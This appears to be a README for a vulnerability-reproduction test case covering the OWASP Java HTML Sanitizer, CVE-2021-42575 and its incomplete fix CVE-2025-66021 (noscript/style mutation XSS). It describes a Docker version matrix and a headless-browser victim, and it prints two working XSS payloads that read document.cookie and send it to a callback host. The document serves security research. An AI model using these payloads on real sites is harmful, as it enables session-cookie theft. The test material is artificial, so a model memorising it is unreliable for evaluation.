# owasp_java_html_sanitizer_noscript_style

OWASP Java HTML Sanitizer — CVE-2021-42575 -> CVE-2025-66021 (HTML-sanitizer `<style>`-text
policy-enforcement bypass / mutation XSS, CWE-79).
**Genuine incomplete fix; gate passed on real Docker over EXTERNAL HTTP (real browser-side JS
execution, not reflection).**

V1 不完整修复的源码级分析见同目录 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

REAL published `owasp-java-html-sanitizer` jar per version (Maven, build-arg `SANITIZER_VER`; the
jar is the ONLY difference across profiles) hosted by `pcb.App` on the JDK-builtin
`com.sun.net.httpserver.HttpServer` (no web framework). The app sanitizes `GET /?html=<payload>`
with `HtmlPolicyBuilder().allowElements("p","div","span","select","option","svg","noscript","style")
.allowTextIn("style").toFactory()` and serves the output verbatim — exactly the custom allowlist
CVE-2025-66021 (GHSA-g9gq-3pfx-2gw2) describes. Execution proof: a selenium headless-Chromium
`victim` (Chrome 149, compose `browser` grid) plants `${PCB_FLAG}` as its `session` cookie on the
app origin and views the page; a smuggled `<script>` that survives sanitization reads
`document.cookie` and navigates to the internal collector (`callback:9000`, host-published
`:35290`) only via real JS execution. Same sink in all three versions = `HtmlStreamRenderer`'s
`<style>` CDATA-text emission.

- **V0 = 20200713.1** (`:35220`) — pre-CVE-2021-42575: style text appended UNGUARDED -> both
  payloads keep the smuggled `</noscript><script>` and execute -> flag.
- **V1 = 20211018.1** (`:35221`, target) — CVE-2021-42575 fix (commit `be33ec6` "Render style tag
  content more strictly"): style text wrapped `/*<![CDATA[<!--*/ ... /*-->]]>*/` AND emptied when it
  contains any `BANNED_IN_STYLE_ELEMENTS` marker (`<![CDATA[`, `]]>`, `<!--`, `-->`) -> the `]]>`
  seed is BLOCKED, but the marker-free residual survives the filter (kept + wrapped), and inside
  `<noscript>` a scripting-enabled browser parses RAWTEXT: the wrapper's `<!--` is trapped as text
  and the smuggled `</noscript>` closes the element, so the trailing `<script>` executes. Incomplete
  fix.
- **V2 = 20260101.1** (`:35222`, -66021 fix, commit `4149cf0`) — tag-like content (`<script>`,
  `</noscript>`, even `< script>`) detected and stripped from `allowTextIn("style")` text -> no
  literal `</noscript>` survives -> residual BLOCKED.

Benign canary: the only "payload" is the victim reading its OWN cookie and navigating to the
internal collector; no external exfil, no destructive action.

- **Original trigger**: `<noscript><style>]]></noscript><script>document.location='//callback:9000/c?f='+document.cookie</script>`
  — style text carries the `]]>` banned marker (the CVE-2021-42575 marker class, adapted to the
  `<noscript>` carrier since modern Chromium's restricted `<select>` parsing no longer executes the
  canonical select>option>style desync and the sanitizer strips `<svg>`); blocked on V1/V2.
- **Residual trigger**: `<noscript><style></noscript><script>document.location='//callback:9000/c?f='+document.cookie</script>`
  — marker-free `<noscript><style>` scripting-desync (upstream CVE-2025-66021 PoC shape); executes
  on V1, blocked on V2.

Run: `python3 oracle.py --wait` (envs up via `docker compose --profile v0 --profile v1 --profile v2
up --build` plus the always-on `callback`/`browser`/`victim`), then `--gate`. Verified matrix
(`repro.log`, flag `PCBFLAG_4419ea...`): ORIGINAL EXEC@v0 / no-exec@v1 / no-exec@v2; RESIDUAL
EXEC@v0 / **EXEC@v1** / no-exec@v2; server-side `/raw` outputs in `repro.log` show V1 emptying the
`]]>`-bearing style text while keeping+wrapping the marker-free one. See `case.json`.

> NOTE: stale version labels in two files — `patch.diff`'s header says "(V0 20211018.1 -> V1
> 20211018.2)" and `_heldout/bypass_poc.py`'s docstring calls the fix "the CVE-2021-42575
> (20211018.2) style-content fix". The authoritative matrix (case.json `versions`, docker-compose.yml
> build args, Dockerfile comments, repro.log) is V0=20200713.1 / V1=20211018.1 / V2=20260101.1;
> case.json `provenance.notes` records the explicit VERSION CORRECTION — `be33ec6` shipped IN
> 20211018.1 (NVD: "before 20211018.1"), while 20211018.2 is a later follow-up that only add-escapes
> select>option>style. The diff body itself is the correct be33ec6 change.
